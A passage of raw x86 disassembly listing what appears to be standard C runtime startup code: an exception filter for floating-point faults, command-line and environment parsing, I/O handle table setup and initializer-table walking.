  422de9:	and    eax,0xfffffffc
  422dec:	call   0x4238b0
  422df1:	mov    ebx,esp
  422df3:	push   0x428464
  422df8:	push   ebx
  422df9:	call   0x423c40
  422dfe:	push   edi
  422dff:	push   ebx
  422e00:	call   0x423c50
  422e05:	push   0x428460
  422e0a:	push   ebx
  422e0b:	call   0x423c50
  422e10:	push   DWORD PTR [esi+0x45c1cc]
  422e16:	push   ebx
  422e17:	call   0x423c50
  422e1c:	push   0x12010
  422e21:	push   0x428438
  422e26:	push   ebx
  422e27:	call   0x423b42
  422e2c:	add    esp,0x2c
  422e2f:	jmp    0x422e56
  422e31:	push   edx
  422e32:	lea    eax,[ebp+0x8]
  422e35:	push   eax
  422e36:	lea    esi,[esi+0x45c1cc]
  422e3c:	push   DWORD PTR [esi]
  422e3e:	call   0x423e70
  422e43:	pop    ecx
  422e44:	push   eax
  422e45:	push   DWORD PTR [esi]
  422e47:	push   0xfffffff4
  422e49:	call   DWORD PTR ds:0x428038
  422e4f:	push   eax
  422e50:	call   DWORD PTR ds:0x428034
  422e56:	lea    esp,[ebp-0x118]
  422e5c:	mov    ecx,DWORD PTR [ebp-0x4]
  422e5f:	xor    ecx,DWORD PTR [ebp+0x4]
  422e62:	call   0x423f2c
  422e67:	pop    edi
  422e68:	pop    esi
  422e69:	pop    ebx
  422e6a:	leave  
  422e6b:	ret    
  422e6c:	mov    eax,ds:0x45cabc
  422e71:	cmp    eax,0x1
  422e74:	je     0x422e83
  422e76:	test   eax,eax
  422e78:	jne    0x422ea4
  422e7a:	cmp    DWORD PTR ds:0x45c1c4,0x1
  422e81:	jne    0x422ea4
  422e83:	push   0xfc
  422e88:	call   0x422cf5
  422e8d:	mov    eax,ds:0x45cb08
  422e92:	test   eax,eax
  422e94:	pop    ecx
  422e95:	je     0x422e99
  422e97:	call   eax
  422e99:	push   0xff
  422e9e:	call   0x422cf5
  422ea3:	pop    ecx
  422ea4:	ret    
  422ea5:	push   ebp
  422ea6:	mov    ebp,esp
  422ea8:	push   ecx
  422ea9:	push   ebx
  422eaa:	push   esi
  422eab:	push   edi
  422eac:	call   0x42370d
  422eb1:	mov    edi,DWORD PTR [ebp+0x8]
  422eb4:	mov    esi,eax
  422eb6:	mov    edx,DWORD PTR [esi+0x54]
  422eb9:	mov    eax,ds:0x45c2dc
  422ebe:	mov    ecx,edx
  422ec0:	cmp    DWORD PTR [ecx],edi
  422ec2:	je     0x422ed1
  422ec4:	lea    ebx,[eax+eax*2]
  422ec7:	add    ecx,0xc
  422eca:	lea    ebx,[edx+ebx*4]
  422ecd:	cmp    ecx,ebx
  422ecf:	jb     0x422ec0
  422ed1:	lea    eax,[eax+eax*2]
  422ed4:	lea    eax,[edx+eax*4]
  422ed7:	cmp    ecx,eax
  422ed9:	jae    0x422edf
  422edb:	cmp    DWORD PTR [ecx],edi
  422edd:	je     0x422ee1
  422edf:	xor    ecx,ecx
  422ee1:	test   ecx,ecx
  422ee3:	je     0x422ffb
  422ee9:	mov    ebx,DWORD PTR [ecx+0x8]
  422eec:	test   ebx,ebx
  422eee:	mov    DWORD PTR [ebp+0x8],ebx
  422ef1:	je     0x422ffb
  422ef7:	cmp    ebx,0x5
  422efa:	jne    0x422f08
  422efc:	and    DWORD PTR [ecx+0x8],0x0
  422f00:	xor    eax,eax
  422f02:	inc    eax
  422f03:	jmp    0x423004
  422f08:	cmp    ebx,0x1
  422f0b:	je     0x422ff6
  422f11:	mov    eax,DWORD PTR [esi+0x58]
  422f14:	mov    DWORD PTR [ebp-0x4],eax
  422f17:	mov    eax,DWORD PTR [ebp+0xc]
  422f1a:	mov    DWORD PTR [esi+0x58],eax
  422f1d:	mov    eax,DWORD PTR [ecx+0x4]
  422f20:	cmp    eax,0x8
  422f23:	jne    0x422fe8
  422f29:	mov    edx,DWORD PTR ds:0x45c2d0
  422f2f:	mov    eax,ds:0x45c2d4
  422f34:	add    eax,edx
  422f36:	cmp    edx,eax
  422f38:	jge    0x422f61
  422f3a:	lea    eax,[edx+edx*2]
  422f3d:	shl    eax,0x2
  422f40:	mov    edi,DWORD PTR [esi+0x54]
  422f43:	and    DWORD PTR [eax+edi*1+0x8],0x0
  422f48:	mov    edi,DWORD PTR ds:0x45c2d0
  422f4e:	mov    ebx,DWORD PTR ds:0x45c2d4
  422f54:	inc    edx
  422f55:	add    ebx,edi
  422f57:	add    eax,0xc
  422f5a:	cmp    edx,ebx
  422f5c:	jl     0x422f40
  422f5e:	mov    ebx,DWORD PTR [ebp+0x8]
  422f61:	mov    ecx,DWORD PTR [ecx]
  422f63:	cmp    ecx,0xc000008e
  422f69:	mov    edi,DWORD PTR [esi+0x5c]
  422f6c:	jne    0x422f77
  422f6e:	mov    DWORD PTR [esi+0x5c],0x83
  422f75:	jmp    0x422fdb
  422f77:	cmp    ecx,0xc0000090
  422f7d:	jne    0x422f88
  422f7f:	mov    DWORD PTR [esi+0x5c],0x81
  422f86:	jmp    0x422fdb
  422f88:	cmp    ecx,0xc0000091
  422f8e:	jne    0x422f99
  422f90:	mov    DWORD PTR [esi+0x5c],0x84
  422f97:	jmp    0x422fdb
  422f99:	cmp    ecx,0xc0000093
  422f9f:	jne    0x422faa
  422fa1:	mov    DWORD PTR [esi+0x5c],0x85
  422fa8:	jmp    0x422fdb
  422faa:	cmp    ecx,0xc000008d
  422fb0:	jne    0x422fbb
  422fb2:	mov    DWORD PTR [esi+0x5c],0x82
  422fb9:	jmp    0x422fdb
  422fbb:	cmp    ecx,0xc000008f
  422fc1:	jne    0x422fcc
  422fc3:	mov    DWORD PTR [esi+0x5c],0x86
  422fca:	jmp    0x422fdb
  422fcc:	cmp    ecx,0xc0000092
  422fd2:	jne    0x422fdb
  422fd4:	mov    DWORD PTR [esi+0x5c],0x8a
  422fdb:	push   DWORD PTR [esi+0x5c]
  422fde:	push   0x8
  422fe0:	call   ebx
  422fe2:	pop    ecx
  422fe3:	mov    DWORD PTR [esi+0x5c],edi
  422fe6:	jmp    0x422fef
  422fe8:	and    DWORD PTR [ecx+0x8],0x0
  422fec:	push   eax
  422fed:	call   ebx
  422fef:	mov    eax,DWORD PTR [ebp-0x4]
  422ff2:	pop    ecx
  422ff3:	mov    DWORD PTR [esi+0x58],eax
  422ff6:	or     eax,0xffffffff
  422ff9:	jmp    0x423004
  422ffb:	push   DWORD PTR [ebp+0xc]
  422ffe:	call   DWORD PTR ds:0x428040
  423004:	pop    edi
  423005:	pop    esi
  423006:	pop    ebx
  423007:	leave  
  423008:	ret    
  423009:	cmp    DWORD PTR ds:0x45d26c,0x0
  423010:	jne    0x423017
  423012:	call   0x42444c
  423017:	push   esi
  423018:	mov    esi,DWORD PTR ds:0x45d274
  42301e:	test   esi,esi
  423020:	jne    0x423029
  423022:	mov    esi,0x42849b
  423027:	jmp    0x42306e
  423029:	mov    al,BYTE PTR [esi]
  42302b:	cmp    al,0x22
  42302d:	jne    0x423057
  42302f:	inc    esi
  423030:	mov    al,BYTE PTR [esi]
  423032:	cmp    al,0x22
  423034:	je     0x423067
  423036:	test   al,al
  423038:	je     0x423050
  42303a:	movzx  eax,al
  42303d:	push   eax
  42303e:	call   0x423f6b
  423043:	test   eax,eax
  423045:	pop    ecx
  423046:	je     0x423049
  423048:	inc    esi
  423049:	inc    esi
  42304a:	mov    al,BYTE PTR [esi]
  42304c:	cmp    al,0x22
  42304e:	jne    0x423036
  423050:	cmp    BYTE PTR [esi],0x22
  423053:	jne    0x423068
  423055:	jmp    0x423067
  423057:	cmp    al,0x20
  423059:	jbe    0x423068
  42305b:	inc    esi
  42305c:	cmp    BYTE PTR [esi],0x20
  42305f:	ja     0x42305b
  423061:	jmp    0x423068
  423063:	cmp    al,0x20
  423065:	ja     0x42306e
  423067:	inc    esi
  423068:	mov    al,BYTE PTR [esi]
  42306a:	test   al,al
  42306c:	jne    0x423063
  42306e:	mov    eax,esi
  423070:	pop    esi
  423071:	ret    
  423072:	push   ebx
  423073:	xor    ebx,ebx
  423075:	cmp    DWORD PTR ds:0x45d26c,ebx
  42307b:	push   esi
  42307c:	push   edi
  42307d:	jne    0x423084
  42307f:	call   0x42444c
  423084:	mov    esi,DWORD PTR ds:0x45cab4
  42308a:	xor    edi,edi
  42308c:	cmp    esi,ebx
  42308e:	jne    0x4230a2
  423090:	jmp    0x4230c2
  423092:	cmp    al,0x3d
  423094:	je     0x423097
  423096:	inc    edi
  423097:	push   esi
  423098:	call   0x423e70
  42309d:	pop    ecx
  42309e:	lea    esi,[esi+eax*1+0x1]
  4230a2:	mov    al,BYTE PTR [esi]
  4230a4:	cmp    al,bl
  4230a6:	jne    0x423092
  4230a8:	lea    eax,[edi*4+0x4]
  4230af:	push   eax
  4230b0:	call   0x424582
  4230b5:	mov    edi,eax
  4230b7:	cmp    edi,ebx
  4230b9:	pop    ecx
  4230ba:	mov    DWORD PTR ds:0x45cae4,edi
  4230c0:	jne    0x4230c7
  4230c2:	or     eax,0xffffffff
  4230c5:	jmp    0x42311f
  4230c7:	mov    esi,DWORD PTR ds:0x45cab4
  4230cd:	push   ebp
  4230ce:	jmp    0x4230fa
  4230d0:	push   esi
  4230d1:	call   0x423e70
  4230d6:	mov    ebp,eax
  4230d8:	inc    ebp
  4230d9:	cmp    BYTE PTR [esi],0x3d
  4230dc:	pop    ecx
  4230dd:	je     0x4230f8
  4230df:	push   ebp
  4230e0:	call   0x424582
  4230e5:	cmp    eax,ebx
  4230e7:	pop    ecx
  4230e8:	mov    DWORD PTR [edi],eax
  4230ea:	je     0x423123
  4230ec:	push   esi
  4230ed:	push   eax
  4230ee:	call   0x423c40
  4230f3:	pop    ecx
  4230f4:	pop    ecx
  4230f5:	add    edi,0x4
  4230f8:	add    esi,ebp
  4230fa:	cmp    BYTE PTR [esi],bl
  4230fc:	jne    0x4230d0
  4230fe:	push   DWORD PTR ds:0x45cab4
  423104:	call   0x42446a
  423109:	mov    DWORD PTR ds:0x45cab4,ebx
  42310f:	mov    DWORD PTR [edi],ebx
  423111:	mov    DWORD PTR ds:0x45d260,0x1
  42311b:	xor    eax,eax
  42311d:	pop    ecx
  42311e:	pop    ebp
  42311f:	pop    edi
  423120:	pop    esi
  423121:	pop    ebx
  423122:	ret    
  423123:	push   DWORD PTR ds:0x45cae4
  423129:	call   0x42446a
  42312e:	mov    DWORD PTR ds:0x45cae4,ebx
  423134:	or     eax,0xffffffff
  423137:	jmp    0x42311d
  423139:	push   ebp
  42313a:	mov    ebp,esp
  42313c:	push   ecx
  42313d:	push   ebx
  42313e:	mov    ebx,DWORD PTR [ebp+0xc]
  423141:	xor    edx,edx
  423143:	cmp    DWORD PTR [ebp+0x8],edx
  423146:	push   edi
  423147:	mov    DWORD PTR [esi],edx
  423149:	mov    edi,ecx
  42314b:	mov    DWORD PTR [ebx],0x1
  423151:	je     0x42315c
  423153:	mov    ecx,DWORD PTR [ebp+0x8]
  423156:	add    DWORD PTR [ebp+0x8],0x4
  42315a:	mov    DWORD PTR [ecx],edi
  42315c:	cmp    BYTE PTR [eax],0x22
  42315f:	jne    0x42316f
  423161:	xor    ecx,ecx
  423163:	test   edx,edx
  423165:	sete   cl
  423168:	inc    eax
  423169:	mov    edx,ecx
  42316b:	mov    cl,0x22
  42316d:	jmp    0x42319c
  42316f:	inc    DWORD PTR [esi]
  423171:	test   edi,edi
  423173:	je     0x42317a
  423175:	mov    cl,BYTE PTR [eax]
  423177:	mov    BYTE PTR [edi],cl
  423179:	inc    edi
  42317a:	mov    cl,BYTE PTR [eax]
  42317c:	movzx  ebx,cl
  42317f:	inc    eax
  423180:	test   BYTE PTR [ebx+0x45cf21],0x4
  423187:	je     0x423195
  423189:	inc    DWORD PTR [esi]
  42318b:	test   edi,edi
  42318d:	je     0x423194
  42318f:	mov    bl,BYTE PTR [eax]
  423191:	mov    BYTE PTR [edi],bl
  423193:	inc    edi
  423194:	inc    eax
  423195:	test   cl,cl
  423197:	mov    ebx,DWORD PTR [ebp+0xc]
  42319a:	je     0x4231ce
  42319c:	test   edx,edx
  42319e:	jne    0x42315c
  4231a0:	cmp    cl,0x20
  4231a3:	je     0x4231aa
  4231a5:	cmp    cl,0x9
  4231a8:	jne    0x42315c
  4231aa:	test   edi,edi
  4231ac:	je     0x4231b2
  4231ae:	and    BYTE PTR [edi-0x1],0x0
  4231b2:	and    DWORD PTR [ebp-0x4],0x0
  4231b6:	cmp    BYTE PTR [eax],0x0
  4231b9:	je     0x423295
  4231bf:	mov    cl,BYTE PTR [eax]
  4231c1:	cmp    cl,0x20
  4231c4:	je     0x4231cb
  4231c6:	cmp    cl,0x9
  4231c9:	jne    0x4231d1
  4231cb:	inc    eax
  4231cc:	jmp    0x4231bf
  4231ce:	dec    eax
  4231cf:	jmp    0x4231b2
  4231d1:	cmp    BYTE PTR [eax],0x0
  4231d4:	je     0x423295
  4231da:	cmp    DWORD PTR [ebp+0x8],0x0
  4231de:	je     0x4231e9
  4231e0:	mov    ecx,DWORD PTR [ebp+0x8]
  4231e3:	add    DWORD PTR [ebp+0x8],0x4
  4231e7:	mov    DWORD PTR [ecx],edi
  4231e9:	inc    DWORD PTR [ebx]
  4231eb:	xor    ebx,ebx
  4231ed:	inc    ebx
  4231ee:	xor    edx,edx
  4231f0:	jmp    0x4231f4
  4231f2:	inc    eax
  4231f3:	inc    edx
  4231f4:	cmp    BYTE PTR [eax],0x5c
  4231f7:	je     0x4231f2
  4231f9:	cmp    BYTE PTR [eax],0x22
  4231fc:	jne    0x423224
  4231fe:	test   dl,0x1
  423201:	jne    0x423222
  423203:	cmp    DWORD PTR [ebp-0x4],0x0
  423207:	je     0x423215
  423209:	lea    ecx,[eax+0x1]
  42320c:	cmp    BYTE PTR [ecx],0x22
  42320f:	jne    0x423215
  423211:	mov    eax,ecx
  423213:	jmp    0x423217
  423215:	xor    ebx,ebx
  423217:	xor    ecx,ecx
  423219:	cmp    DWORD PTR [ebp-0x4],ecx
  42321c:	sete   cl
  42321f:	mov    DWORD PTR [ebp-0x4],ecx
  423222:	shr    edx,1
  423224:	test   edx,edx
  423226:	je     0x423235
  423228:	test   edi,edi
  42322a:	je     0x423230
  42322c:	mov    BYTE PTR [edi],0x5c
  42322f:	inc    edi
  423230:	inc    DWORD PTR [esi]
  423232:	dec    edx
  423233:	jne    0x423228
  423235:	mov    cl,BYTE PTR [eax]
  423237:	test   cl,cl
  423239:	je     0x423283
  42323b:	cmp    DWORD PTR [ebp-0x4],0x0
  42323f:	jne    0x42324b
  423241:	cmp    cl,0x20
  423244:	je     0x423283
  423246:	cmp    cl,0x9
  423249:	je     0x423283
  42324b:	test   ebx,ebx
  42324d:	je     0x42327d
  42324f:	test   edi,edi
  423251:	je     0x42326c
  423253:	movzx  edx,cl
  423256:	test   BYTE PTR [edx+0x45cf21],0x4
  42325d:	je     0x423265
  42325f:	mov    BYTE PTR [edi],cl
  423261:	inc    edi
  423262:	inc    eax
  423263:	inc    DWORD PTR [esi]
  423265:	mov    cl,BYTE PTR [eax]
  423267:	mov    BYTE PTR [edi],cl
  423269:	inc    edi
  42326a:	jmp    0x42327b
  42326c:	movzx  ecx,cl
  42326f:	test   BYTE PTR [ecx+0x45cf21],0x4
  423276:	je     0x42327b
  423278:	inc    eax
  423279:	inc    DWORD PTR [esi]
  42327b:	inc    DWORD PTR [esi]
  42327d:	inc    eax
  42327e:	jmp    0x4231eb
  423283:	test   edi,edi
  423285:	je     0x42328b
  423287:	and    BYTE PTR [edi],0x0
  42328a:	inc    edi
  42328b:	inc    DWORD PTR [esi]
  42328d:	mov    ebx,DWORD PTR [ebp+0xc]
  423290:	jmp    0x4231b6
  423295:	mov    eax,DWORD PTR [ebp+0x8]
  423298:	test   eax,eax
  42329a:	je     0x42329f
  42329c:	and    DWORD PTR [eax],0x0
  42329f:	inc    DWORD PTR [ebx]
  4232a1:	pop    edi
  4232a2:	pop    ebx
  4232a3:	leave  
  4232a4:	ret    
  4232a5:	push   ebp
  4232a6:	mov    ebp,esp
  4232a8:	push   ecx
  4232a9:	push   ecx
  4232aa:	push   ebx
  4232ab:	push   esi
  4232ac:	push   edi
  4232ad:	xor    edi,edi
  4232af:	cmp    DWORD PTR ds:0x45d26c,edi
  4232b5:	jne    0x4232bc
  4232b7:	call   0x42444c
  4232bc:	and    BYTE PTR ds:0x45cc14,0x0
  4232c3:	push   0x104
  4232c8:	mov    esi,0x45cb10
  4232cd:	push   esi
  4232ce:	push   edi
  4232cf:	call   DWORD PTR ds:0x42803c
  4232d5:	mov    eax,ds:0x45d274
  4232da:	cmp    eax,edi
  4232dc:	mov    DWORD PTR ds:0x45caf4,esi
  4232e2:	je     0x4232eb
  4232e4:	cmp    BYTE PTR [eax],0x0
  4232e7:	mov    ebx,eax
  4232e9:	jne    0x4232ed
  4232eb:	mov    ebx,esi
  4232ed:	lea    eax,[ebp-0x4]
  4232f0:	push   eax
  4232f1:	push   edi
  4232f2:	lea    esi,[ebp-0x8]
  4232f5:	xor    ecx,ecx
  4232f7:	mov    eax,ebx
  4232f9:	call   0x423139
  4232fe:	mov    esi,DWORD PTR [ebp-0x4]
  423301:	mov    eax,DWORD PTR [ebp-0x8]
  423304:	shl    esi,0x2
  423307:	add    eax,esi
  423309:	push   eax
  42330a:	call   0x424582
  42330f:	mov    edi,eax
  423311:	add    esp,0xc
  423314:	test   edi,edi
  423316:	jne    0x42331d
  423318:	or     eax,0xffffffff
  42331b:	jmp    0x423342
  42331d:	lea    eax,[ebp-0x4]
  423320:	push   eax
  423321:	lea    ecx,[esi+edi*1]
  423324:	push   edi
  423325:	lea    esi,[ebp-0x8]
  423328:	mov    eax,ebx
  42332a:	call   0x423139
  42332f:	mov    eax,DWORD PTR [ebp-0x4]
  423332:	dec    eax
  423333:	pop    ecx
  423334:	mov    ds:0x45cad8,eax
  423339:	pop    ecx
  42333a:	mov    DWORD PTR ds:0x45cadc,edi
  423340:	xor    eax,eax
  423342:	pop    edi
  423343:	pop    esi
  423344:	pop    ebx
  423345:	leave  
  423346:	ret    
  423347:	push   ecx
  423348:	push   ecx
  423349:	mov    eax,ds:0x45cc18
  42334e:	push   ebx
  42334f:	push   ebp
  423350:	push   esi
  423351:	push   edi
  423352:	mov    edi,DWORD PTR ds:0x428054
  423358:	xor    ebx,ebx
  42335a:	xor    esi,esi
  42335c:	cmp    eax,ebx
  42335e:	push   0x2
  423360:	pop    ebp
  423361:	jne    0x423390
  423363:	call   edi
  423365:	mov    esi,eax
  423367:	cmp    esi,ebx
  423369:	je     0x423377
  42336b:	mov    DWORD PTR ds:0x45cc18,0x1
  423375:	jmp    0x423395
  423377:	call   DWORD PTR ds:0x428010
  42337d:	cmp    eax,0x78
  423380:	jne    0x42338b
  423382:	mov    eax,ebp
  423384:	mov    ds:0x45cc18,eax
  423389:	jmp    0x423390
  42338b:	mov    eax,ds:0x45cc18
  423390:	cmp    eax,0x1
  423393:	jne    0x423412
  423395:	cmp    esi,ebx
  423397:	jne    0x4233a1
  423399:	call   edi
  42339b:	mov    esi,eax
  42339d:	cmp    esi,ebx
  42339f:	je     0x42341a
  4233a1:	cmp    WORD PTR [esi],bx
  4233a4:	mov    eax,esi
  4233a6:	je     0x4233b6
  4233a8:	add    eax,ebp
  4233aa:	cmp    WORD PTR [eax],bx
  4233ad:	jne    0x4233a8
  4233af:	add    eax,ebp
  4233b1:	cmp    WORD PTR [eax],bx
  4233b4:	jne    0x4233a8
  4233b6:	mov    edi,DWORD PTR ds:0x428050
  4233bc:	push   ebx
  4233bd:	push   ebx
  4233be:	push   ebx
  4233bf:	sub    eax,esi
  4233c1:	push   ebx
  4233c2:	sar    eax,1
  4233c4:	inc    eax
  4233c5:	push   eax
  4233c6:	push   esi
  4233c7:	push   ebx
  4233c8:	push   ebx
  4233c9:	mov    DWORD PTR [esp+0x34],eax
  4233cd:	call   edi
  4233cf:	mov    ebp,eax
  4233d1:	cmp    ebp,ebx
  4233d3:	je     0x423407
  4233d5:	push   ebp
  4233d6:	call   0x424582
  4233db:	cmp    eax,ebx
  4233dd:	pop    ecx
  4233de:	mov    DWORD PTR [esp+0x10],eax
  4233e2:	je     0x423407
  4233e4:	push   ebx
  4233e5:	push   ebx
  4233e6:	push   ebp
  4233e7:	push   eax
  4233e8:	push   DWORD PTR [esp+0x24]
  4233ec:	push   esi
  4233ed:	push   ebx
  4233ee:	push   ebx
  4233ef:	call   edi
  4233f1:	test   eax,eax
  4233f3:	jne    0x423403
  4233f5:	push   DWORD PTR [esp+0x10]
  4233f9:	call   0x42446a
  4233fe:	pop    ecx
  4233ff:	mov    DWORD PTR [esp+0x10],ebx
  423403:	mov    ebx,DWORD PTR [esp+0x10]
  423407:	push   esi
  423408:	call   DWORD PTR ds:0x42804c
  42340e:	mov    eax,ebx
  423410:	jmp    0x423462
  423412:	cmp    eax,ebp
  423414:	je     0x42341e
  423416:	cmp    eax,ebx
  423418:	je     0x42341e
  42341a:	xor    eax,eax
  42341c:	jmp    0x423462
  42341e:	call   DWORD PTR ds:0x428048
  423424:	mov    esi,eax
  423426:	cmp    esi,ebx
  423428:	je     0x42341a
  42342a:	cmp    BYTE PTR [esi],bl
  42342c:	je     0x423438
  42342e:	inc    eax
  42342f:	cmp    BYTE PTR [eax],bl
  423431:	jne    0x42342e
  423433:	inc    eax
  423434:	cmp    BYTE PTR [eax],bl
  423436:	jne    0x42342e
  423438:	sub    eax,esi
  42343a:	inc    eax
  42343b:	mov    ebp,eax
  42343d:	push   ebp
  42343e:	call   0x424582
  423443:	mov    edi,eax
  423445:	cmp    edi,ebx
  423447:	pop    ecx
  423448:	jne    0x42344e
  42344a:	xor    edi,edi
  42344c:	jmp    0x423459
  42344e:	push   ebp
  42344f:	push   esi
  423450:	push   edi
  423451:	call   0x4245a0
  423456:	add    esp,0xc
  423459:	push   esi
  42345a:	call   DWORD PTR ds:0x428044
  423460:	mov    eax,edi
  423462:	pop    edi
  423463:	pop    esi
  423464:	pop    ebp
  423465:	pop    ebx
  423466:	pop    ecx
  423467:	pop    ecx
  423468:	ret    
  423469:	sub    esp,0x48
  42346c:	push   ebx
  42346d:	mov    ebx,0x480
  423472:	push   ebx
  423473:	call   0x424582
  423478:	test   eax,eax
  42347a:	pop    ecx
  42347b:	jne    0x423485
  42347d:	or     eax,0xffffffff
  423480:	jmp    0x423662
  423485:	mov    ds:0x45d160,eax
  42348a:	mov    DWORD PTR ds:0x45d148,0x20
  423494:	lea    ecx,[eax+0x480]
  42349a:	jmp    0x4234ba
  42349c:	and    BYTE PTR [eax+0x4],0x0
  4234a0:	or     DWORD PTR [eax],0xffffffff
  4234a3:	and    DWORD PTR [eax+0x8],0x0
  4234a7:	mov    BYTE PTR [eax+0x5],0xa
  4234ab:	mov    ecx,DWORD PTR ds:0x45d160
  4234b1:	add    eax,0x24
  4234b4:	add    ecx,0x480
  4234ba:	cmp    eax,ecx
  4234bc:	jb     0x42349c
  4234be:	push   ebp
  4234bf:	push   esi
  4234c0:	push   edi
  4234c1:	lea    eax,[esp+0x14]
  4234c5:	push   eax
  4234c6:	call   DWORD PTR ds:0x42801c
  4234cc:	cmp    WORD PTR [esp+0x46],0x0
  4234d2:	je     0x4235c1
  4234d8:	mov    eax,DWORD PTR [esp+0x48]
  4234dc:	test   eax,eax
  4234de:	je     0x4235c1
  4234e4:	mov    edi,DWORD PTR [eax]
  4234e6:	lea    ebp,[eax+0x4]
  4234e9:	lea    eax,[edi+ebp*1]
  4234ec:	mov    DWORD PTR [esp+0x10],eax
  4234f0:	mov    eax,0x800
  4234f5:	cmp    edi,eax
  4234f7:	jl     0x4234fb
  4234f9:	mov    edi,eax
  4234fb:	cmp    DWORD PTR ds:0x45d148,edi
  423501:	jge    0x423551
  423503:	mov    esi,0x45d164
  423508:	push   ebx
  423509:	call   0x424582
  42350e:	test   eax,eax
  423510:	pop    ecx
  423511:	je     0x42354b
  423513:	add    DWORD PTR ds:0x45d148,0x20
  42351a:	mov    DWORD PTR [esi],eax
  42351c:	lea    ecx,[eax+0x480]
  423522:	jmp    0x42353a
  423524:	and    BYTE PTR [eax+0x4],0x0
  423528:	or     DWORD PTR [eax],0xffffffff
  42352b:	and    DWORD PTR [eax+0x8],0x0
  42352f:	mov    BYTE PTR [eax+0x5],0xa
  423533:	mov    ecx,DWORD PTR [esi]
  423535:	add    eax,0x24
  423538:	add    ecx,ebx
  42353a:	cmp    eax,ecx
  42353c:	jb     0x423524
  42353e:	add    esi,0x4
  423541:	cmp    DWORD PTR ds:0x45d148,edi
  423547:	jl     0x423508
  423549:	jmp    0x423551
  42354b:	mov    edi,DWORD PTR ds:0x45d148
  423551:	xor    ebx,ebx
  423553:	test   edi,edi
  423555:	jle    0x4235c1
  423557:	mov    eax,DWORD PTR [esp+0x10]
  42355b:	mov    eax,DWORD PTR [eax]
  42355d:	cmp    eax,0xffffffff
  423560:	je     0x4235b6
  423562:	mov    cl,BYTE PTR [ebp+0x0]
  423565:	test   cl,0x1
  423568:	je     0x4235b6
  42356a:	test   cl,0x8
  42356d:	jne    0x42357a
  42356f:	push   eax
  423570:	call   DWORD PTR ds:0x42805c
  423576:	test   eax,eax
  423578:	je     0x4235b6
  42357a:	mov    ecx,ebx
  42357c:	mov    eax,ebx
  42357e:	and    eax,0x1f
  423581:	lea    eax,[eax+eax*8]
  423584:	sar    ecx,0x5
  423587:	mov    ecx,DWORD PTR [ecx*4+0x45d160]
  42358e:	lea    esi,[ecx+eax*4]
  423591:	mov    eax,DWORD PTR [esp+0x10]
  423595:	mov    eax,DWORD PTR [eax]
  423597:	mov    DWORD PTR [esi],eax
  423599:	mov    al,BYTE PTR [ebp+0x0]
  42359c:	mov    BYTE PTR [esi+0x4],al
  42359f:	lea    eax,[esi+0xc]
  4235a2:	push   0xfa0
  4235a7:	push   eax
  4235a8:	call   0x4248ed
  4235ad:	test   eax,eax
  4235af:	pop    ecx
  4235b0:	pop    ecx
  4235b1:	je     0x4235e1
  4235b3:	inc    DWORD PTR [esi+0x8]
  4235b6:	add    DWORD PTR [esp+0x10],0x4
  4235bb:	inc    ebx
  4235bc:	inc    ebp
  4235bd:	cmp    ebx,edi
  4235bf:	jl     0x423557
  4235c1:	xor    ebx,ebx
  4235c3:	mov    ecx,DWORD PTR ds:0x45d160
  4235c9:	lea    eax,[ebx+ebx*8]
  4235cc:	lea    esi,[ecx+eax*4]
  4235cf:	cmp    DWORD PTR [esi],0xffffffff
  4235d2:	jne    0x423643
  4235d4:	test   ebx,ebx
  4235d6:	mov    BYTE PTR [esi+0x4],0x81
  4235da:	jne    0x4235e6
  4235dc:	push   0xfffffff6
  4235de:	pop    eax
  4235df:	jmp    0x4235f0
  4235e1:	or     eax,0xffffffff
  4235e4:	jmp    0x42365f
  4235e6:	mov    eax,ebx
  4235e8:	dec    eax
  4235e9:	neg    eax
  4235eb:	sbb    eax,eax
  4235ed:	add    eax,0xfffffff5
  4235f0:	push   eax
  4235f1:	call   DWORD PTR ds:0x428038
  4235f7:	mov    edi,eax
  4235f9:	cmp    edi,0xffffffff
  4235fc:	je     0x42363d
  4235fe:	push   edi
  4235ff:	call   DWORD PTR ds:0x42805c
  423605:	test   eax,eax
  423607:	je     0x42363d
  423609:	and    eax,0xff
  42360e:	cmp    eax,0x2
  423611:	mov    DWORD PTR [esi],edi
  423613:	jne    0x42361b
  423615:	or     BYTE PTR [esi+0x4],0x40
  423619:	jmp    0x423624
  42361b:	cmp    eax,0x3
  42361e:	jne    0x423624
  423620:	or     BYTE PTR [esi+0x4],0x8
  423624:	lea    eax,[esi+0xc]
  423627:	push   0xfa0
  42362c:	push   eax
  42362d:	call   0x4248ed
  423632:	test   eax,eax
  423634:	pop    ecx
  423635:	pop    ecx
  423636:	je     0x4235e1
  423638:	inc    DWORD PTR [esi+0x8]
  42363b:	jmp    0x423647
  42363d:	or     BYTE PTR [esi+0x4],0x40
  423641:	jmp    0x423647
  423643:	or     BYTE PTR [esi+0x4],0x80
  423647:	inc    ebx
  423648:	cmp    ebx,0x3
  42364b:	jl     0x4235c3
  423651:	push   DWORD PTR ds:0x45d148
  423657:	call   DWORD PTR ds:0x428058
  42365d:	xor    eax,eax
  42365f:	pop    edi
  423660:	pop    esi
  423661:	pop    ebp
  423662:	pop    ebx
  423663:	add    esp,0x48
  423666:	ret    
  423667:	push   0xc
  423669:	push   0x4284a0
  42366e:	call   0x423858
  423673:	mov    DWORD PTR [ebp-0x1c],0x428ef8
  42367a:	cmp    DWORD PTR [ebp-0x1c],0x428ef8
  423681:	jae    0x4236a5
  423683:	and    DWORD PTR [ebp-0x4],0x0
  423687:	mov    eax,DWORD PTR [ebp-0x1c]
  42368a:	mov    eax,DWORD PTR [eax]
  42368c:	test   eax,eax
  42368e:	je     0x42369b
  423690:	call   eax
  423692:	jmp    0x42369b
  423694:	xor    eax,eax
  423696:	inc    eax
  423697:	ret    
  423698:	mov    esp,DWORD PTR [ebp-0x18]
  42369b:	or     DWORD PTR [ebp-0x4],0xffffffff
  42369f:	add    DWORD PTR [ebp-0x1c],0x4
  4236a3:	jmp    0x42367a
  4236a5:	call   0x423893
  4236aa:	ret    
  4236ab:	push   0xc
  4236ad:	push   0x4284b0
  4236b2:	call   0x423858
  4236b7:	mov    DWORD PTR [ebp-0x1c],0x428f00
  4236be:	cmp    DWORD PTR [ebp-0x1c],0x428f00
  4236c5:	jae    0x4236e9
  4236c7:	and    DWORD PTR [ebp-0x4],0x0
  4236cb:	mov    eax,DWORD PTR [ebp-0x1c]
  4236ce:	mov    eax,DWORD PTR [eax]
  4236d0:	test   eax,eax
  4236d2:	je     0x4236df
  4236d4:	call   eax
  4236d6:	jmp    0x4236df
  4236d8:	xor    eax,eax
  4236da:	inc    eax
  4236db:	ret    
  4236dc:	mov    esp,DWORD PTR [ebp-0x18]
